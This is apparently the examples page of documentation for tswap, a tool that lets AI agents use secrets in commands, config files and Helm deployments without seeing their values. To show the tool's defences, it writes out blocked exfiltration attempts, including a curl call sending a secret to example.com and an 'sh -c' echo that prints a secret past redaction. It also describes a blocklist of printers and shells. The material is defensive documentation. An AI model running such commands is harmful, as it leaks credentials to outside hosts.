# Examples

This page is for anyone who wants to see tswap in use. It shows an AI agent's workflow, a backup
script, keeping secrets out of config files, and three ways to deploy with Helm. Every command's
full usage is in [commands.md](commands.md).

## An AI agent workflow

An AI agent like Claude Code can manage and use secrets without seeing them:

```bash
# Agent creates a database password (never sees the value)
tswap create db-password 48

# Agent checks what secrets are available
tswap names
# db-password
# storj-pass

# Agent uses the secret in a command
tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"

# The secret is substituted at runtime — the agent's history shows:
#   tswap run psql "postgresql://app:{{db-password}}@localhost/mydb" -c "SELECT 1"
# NOT the actual password
```

```bash
# Agent imports a secret from Kubernetes (never sees the value)
kubectl get secret db-creds -n prod -o json | jq -r '.data["password"] // empty' | base64 -d | tswap ingest k8s-db-pass

# If the agent accidentally sees a plaintext value, it marks it burned
tswap burn k8s-db-pass "value appeared in command output"

# Check what needs rotation
tswap burned
```

What to do after a burn: [rotating-and-burning.md](rotating-and-burning.md).

Some exfiltration attempts are blocked (the blocklist is shallow, see below):

```bash
tswap run echo {{db-password}}
# Error: 'echo' would expose secret values. ...

tswap run sh -c 'echo {{db-password}} | rev'
# Error: 'sh -c' runs inline code, which can transform and print secrets past redaction.
#        Put the commands in a script file and run that instead, e.g. 'run ./script.sh {{secret}}' ...

tswap run curl 'http://example.com/?key={{db-password}}' '|' cat
# Error: Pipes and output redirection are not allowed in 'run' commands.
```

tswap checks the command it is given. A pipe or redirect your own shell handles (an unquoted `|` or
`>`) never reaches tswap: the shell applies it to tswap's output.

What the blocklist covers, and what it doesn't: [security-model.md](security-model.md#threat-model-and-non-goals).

## A backup script

```bash
#!/bin/bash
# This script holds no secret value (only the secret's name): it is safe to commit, share,
# or show to AI agents

tswap run rclone sync \
  --password {{storj-backup}} \
  /data remote:backup
```

Shell history records `{{storj-backup}}`, not the password. While `rclone` runs, its command line
and memory hold the value: see
[What tswap does not protect against](security-model.md#what-tswap-does-not-protect-against).

## Keeping secrets out of config files

In Helm `values.yaml` and similar config files, replace plaintext secrets with empty values and a
tswap comment naming the secret to use:

```yaml
database:
  host: db.example.com
  username: app
  password: ""  # tswap: db-password
redis:
  auth: ""  # tswap: redis-auth
```

An AI agent can read this file without seeing secret values.

- `check` verifies that every marker names a known secret.
- `tocomment` annotates a file that already has inline secret values.
- `run` with `{{@file}}` uses the filled file in a command (`sudo tswap apply` prints it, for a person).

```bash
# Verify all # tswap: markers in a file reference secrets that exist
tswap check values.yaml

# Automatically replace inline secret values with # tswap: markers
tswap tocomment values.yaml --dry-run   # preview changes
tswap tocomment values.yaml             # apply
```

To use a file with markers in a command, give `run` a `{{@path}}` token where the command takes the
file: tswap fills the markers into a private copy, passes the copy's path, hides the values in the
output and deletes the copy when the command ends (Option 1 below). `sudo tswap apply values.yaml`
prints the filled file to stdout for a person; an agent never runs it.

### Helm deployment patterns

For Helm deployments, there are three approaches.

**Option 1: A file token (recommended).** Put `{{@path}}` where `helm` takes the values file. tswap
writes the filled copy into a private folder only you can open (`$XDG_RUNTIME_DIR`, else the
temporary folder), zeroes and deletes it when `helm` exits, and replaces every written form of the
values (plain, quoted, base64 and base64url, and each line-ending form of a multi-line value) in `helm`'s output with `[REDACTED: name]`. What Helm then does with
the values it is given is up to Helm:

```bash
tswap run helm upgrade --install myapp ./chart -f {{@values.yaml}}

# With multiple values files
tswap run helm upgrade --install myapp ./chart \
  -f values.yaml \
  -f {{@secrets.yaml}}
```

This works in bash, cmd and PowerShell. `run` refuses a command containing a printer, encoder,
copier, shell or interpreter (`cat`, `cp`, `base64`, `sh`, `python`, … as any word of the command)
when it has a file token: the file is data for a tool, never a program. `helm install app ./chart
-f {{@values.yaml}}` is fine, because `install` is refused only as the program itself (also behind a wrapper, or as
the command `find -exec` runs). The limits
are in [Files with secrets](security-model.md#files-with-secrets-run-with-file).

**Note:** the `# tswap: <secret-name>` comments remain in the filled copy, so secret *names*
appear in:

- Helm's `--debug` output;
- release manifests stored in Kubernetes secrets;
- audit logs and observability tools.

This exposes which secrets your application uses (for example `db-password`, `api-key`). If secret names are sensitive in your threat model, use generic names (for example
`secret-1`, `secret-2`).

**Option 2: Individual secret substitution.** Use `{{token}}` syntax with `run`:

```bash
tswap run helm upgrade myapp ./chart \
  --set database.password={{db-password}} \
  --set redis.auth={{redis-auth}}
```

The values are on `helm`'s command line while it runs: see
[What tswap does not protect against](security-model.md#what-tswap-does-not-protect-against).

**Option 3: A temporary file, by hand.** This is a person's pattern, because `apply` needs sudo. The
file holds every value in plaintext, so make it readable by you only and delete it straight after:

```bash
f=$(mktemp)                     # a new file only you can read
sudo tswap apply values.yaml > "$f"
helm upgrade myapp ./chart -f "$f"
rm "$f"
```
